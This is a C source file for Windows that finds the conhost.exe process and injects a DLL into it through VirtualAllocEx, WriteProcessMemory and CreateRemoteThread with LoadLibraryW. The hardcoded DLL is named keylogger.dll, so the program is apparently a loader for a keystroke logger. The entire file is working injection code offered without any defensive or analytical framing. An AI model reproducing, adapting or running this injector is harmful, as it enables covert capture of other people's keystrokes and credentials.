#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors
#pragma warning(disable:4820) // Padding added after data member, this warning cant be removed
#pragma warning(disable:4191) // 'function': unsafe conversion from 'FARPROC' to 'LPTHREAD_START_ROUTINE' false positive

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindTargetPID(const wchar_t* targetName)
{
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	if (Process32FirstW(snapshot, &pe))
	{
		do
		{
			if (wcscmp(pe.szExeFile, targetName) == 0)
			{
				CloseHandle(snapshot);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return 0;
}

int wmain(void)
{
	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
	const wchar_t* targetProcess = L"conhost.exe";

	DWORD pid = FindTargetPID(targetProcess);
	if (pid == 0)
		return 1;
		
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
		return 1;

	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMem)
	{
		CloseHandle(hProcess);
		return 1;
	}

	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
	{
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);

	if (!hThread)
	{
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
